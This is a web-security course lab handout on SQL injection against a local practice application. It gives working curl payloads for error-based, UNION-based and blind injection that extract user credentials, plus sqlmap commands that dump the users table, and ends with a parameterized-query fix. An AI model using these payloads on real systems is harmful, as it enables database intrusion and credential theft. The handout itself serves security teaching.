# Week 02: SQL Injection (SQLi)

## Learning Objectives
- Understand how SQL injection vulnerabilities arise
- Exploit in-band SQL injection (error-based and union-based)
- Use automated SQL injection tools
- Apply mitigation techniques

## Background
SQL injection occurs when user input is directly concatenated into SQL queries without proper sanitization or parameterization.

## Exercises

### Exercise 1: Error-Based SQLi
Target: `GET /products?category=Electronics`

Try the following payloads on the products endpoint:

```bash
# Normal request
curl "http://localhost:8080/products?category=Electronics"

# Break the query - single quote
curl "http://localhost:8080/products?category=Electronics'"

# Break the query - double quote
curl "http://localhost:8080/products?category=Electronics\""

# Always true condition
curl "http://localhost:8080/products?category=Electronics' OR '1'='1"

# Always false condition
curl "http://localhost:8080/products?category=Electronics' AND '1'='2"
```

**Questions:**
- What error messages do you see?
- How many columns does the products table have? (Hint: use `ORDER BY`)
- What database type is being used?

### Exercise 2: UNION-Based SQLi
Determine the number of columns, then extract data:

```bash
# Find column count (increment n until error)
curl "http://localhost:8080/products?category=Electronics' ORDER BY 1--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 2--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 3--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 4--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 5--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 6--"
curl "http://localhost:8080/products?category=Electronics' ORDER BY 7--"

# UNION select to see output columns
curl "http://localhost:8080/products?category=Electronics' UNION SELECT 1,2,3,4,5,6--"

# Extract database version
curl "http://localhost:8080/products?category=Electronics' UNION SELECT 1,version(),3,4,5,6--"

# Extract table names
curl "http://localhost:8080/products?category=Electronics' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables--"

# Extract user credentials
curl "http://localhost:8080/products?category=Electronics' UNION SELECT 1,username||':'||password,3,4,5,6 FROM users--"
```

**Questions:**
- What is the database version?
- What tables exist in the database?
- What are the password hashes for admin, alice, and bob?

### Exercise 3: Blind SQLi on User Search
Target: `GET /users/search?q=`

```bash
# Test for injectable parameter
curl "http://localhost:8080/users/search?q=alice"

# Boolean-based blind
curl "http://localhost:8080/users/search?q=alice' AND 1=1--"
curl "http://localhost:8080/users/search?q=alice' AND 1=2--"

# Extract admin password hash character by character
curl "http://localhost:8080/users/search?q=alice' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='$'--"
```

### Exercise 4: Automated SQLi with sqlmap
```bash
# Run sqlmap on the products category parameter
sqlmap -u "http://localhost:8080/products?category=Electronics" --batch --dbs

# Dump the vulnerabledb database
sqlmap -u "http://localhost:8080/products?category=Electronics" --batch -D vulnerabledb --tables

# Dump users table
sqlmap -u "http://localhost:8080/products?category=Electronics" --batch -D vulnerabledb -T users --dump
```

### Exercise 5: Mitigation
The vulnerable code uses string concatenation:

```javascript
"SELECT * FROM products WHERE category = '" + category + "'"
```

Rewrite this using parameterized queries:

```javascript
"SELECT * FROM products WHERE category = $1"
```

## Deliverable
- Demonstrate exploitation of at least 2 SQLi vulnerabilities
- Use sqlmap to automate extraction of user credentials
- Provide a mitigation strategy for each vulnerable endpoint
